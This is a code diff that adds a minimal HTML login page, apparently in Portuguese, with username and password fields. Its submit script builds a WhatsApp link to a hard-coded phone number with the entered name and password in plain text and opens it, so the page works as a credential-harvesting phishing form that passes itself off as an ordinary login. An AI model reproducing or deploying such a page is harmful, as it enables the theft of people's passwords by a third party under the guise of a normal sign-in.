@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title></title>
+	<link rel="stylesheet" type="text/css" href="1 login page.css">
+</head>
+<body>
+	<div id="bg">
+		<div id="login_div">
+			<input class="input_box" id="login_box" type="text" name="" placeholder="Login">
+			<input class="input_box" id="password_box" type="password" name="" placeholder="Password">
+			<input id="button_login" type="submit" name="" value="Submit" onClick="gotowhatsapp()">
+		</div>
+		
+	</div>
+</body>
+
+<script>
+function gotowhatsapp() {
+    
+    var name = document.getElementById("login_box").value;
+    var password = document.getElementById("password_box").value;
+
+    var url = "https://wa.me/554497505725?text=" 
+    + "NOME: " + name + "%0a"
+    + "SENHA: " + password + "%0a"; 
+
+    window.open(url, '_blank').focus();
+}
+</script>
+
+</html>
